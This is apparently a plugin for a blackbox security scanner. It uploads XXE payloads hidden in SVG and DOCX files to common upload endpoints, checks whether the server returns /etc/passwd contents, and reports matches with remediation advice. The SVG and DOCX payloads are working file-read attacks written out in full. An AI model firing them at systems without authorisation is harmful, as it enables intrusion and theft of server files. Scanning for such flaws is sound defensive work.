"""Plugin: XXE via SVG, DOCX, XLSX file type uploads (blackbox)."""
from __future__ import annotations

import io
import zipfile
from urllib.parse import urlparse, urlunparse

import httpx

from vibee_hacker.core.models import InterPhaseContext, Result, Severity, Target
from vibee_hacker.core.plugin_base import PluginBase

XXE_FILE_INDICATOR = "VIBEE_XXE_PROBE"

# SVG with XXE payload (file read attempt)
SVG_XXE = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text id="{XXE_FILE_INDICATOR}">&xxe;</text>
</svg>""".encode()

# DOCX with XXE (modified document.xml inside ZIP)
DOCX_DOCUMENT_XML = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>{XXE_FILE_INDICATOR} &xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>""".encode()

UPLOAD_PATHS = [
    "/upload",
    "/api/upload",
    "/file/upload",
    "/import",
    "/api/import",
    "/documents/upload",
]

XXE_SUCCESS_INDICATORS = [
    "root:",
    "/bin/bash",
    "/bin/sh",
    "daemon:",
    "VIBEE_XXE_PROBE",
    "nobody:",
]


def _build_docx_payload() -> bytes:
    """Build a minimal DOCX (ZIP) with XXE in document.xml."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml",
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                    '<Override PartName="/word/document.xml" '
                    'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
                    '</Types>')
        zf.writestr("_rels/.rels",
                    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
                    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
                    '</Relationships>')
        zf.writestr("word/document.xml", DOCX_DOCUMENT_XML)
    return buf.getvalue()


class XxeFileTypesPlugin(PluginBase):
    name = "xxe_file_types"
    description = "Send XXE payloads via SVG and DOCX file uploads to detect XXE vulnerabilities"
    category = "blackbox"
    phase = 3
    base_severity = Severity.HIGH

    async def run(self, target: Target, context: InterPhaseContext | None = None) -> list[Result]:
        if not target.url:
            return []

        parsed = urlparse(target.url)
        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
        results: list[Result] = []

        upload_endpoints: list[str] = []
        for path in UPLOAD_PATHS:
            upload_endpoints.append(base + path)
        if context and context.crawl_urls:
            for u in context.crawl_urls:
                if any(kw in u.lower() for kw in ["upload", "import", "document", "file"]):
                    if u not in upload_endpoints:
                        upload_endpoints.append(u)

        payloads = [
            ("xxe_payload.svg", SVG_XXE, "image/svg+xml", "xxe_via_svg"),
            ("xxe_payload.docx", _build_docx_payload(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "xxe_via_docx"),
        ]

        async with httpx.AsyncClient(verify=target.verify_ssl, timeout=15) as client:
            for endpoint in upload_endpoints[:5]:
                for filename, content, mime_type, rule_id in payloads:
                    try:
                        resp = await client.post(
                            endpoint,
                            files={"file": (filename, content, mime_type)},
                            timeout=10,
                        )
                    except (httpx.TransportError, httpx.InvalidURL, httpx.DecodingError):
                        continue

                    if resp.status_code == 404:
                        continue

                    body = resp.text[:5000]
                    has_xxe = any(indicator in body for indicator in XXE_SUCCESS_INDICATORS)

                    if has_xxe:
                        results.append(
                            Result(
                                plugin_name=self.name,
                                base_severity=Severity.HIGH,
                                title=f"XXE via {filename.split('.')[-1].upper()} File Upload",
                                description=(
                                    f"XXE payload in {filename} triggered file system access at {endpoint}. "
                                    "The server's XML parser resolved the external entity and returned file contents."
                                ),
                                evidence=f"POST {endpoint} {filename} → {resp.status_code}: {body[:300]}",
                                recommendation=(
                                    "Disable external entity processing in all XML parsers. "
                                    "Set FEATURE_SECURE_PROCESSING=true and disallow DOCTYPE declarations. "
                                    "Validate and sanitize all uploaded file content."
                                ),
                                cwe_id="CWE-611",
                                rule_id=rule_id,
                                endpoint=endpoint,
                            )
                        )
                        return results

        return results
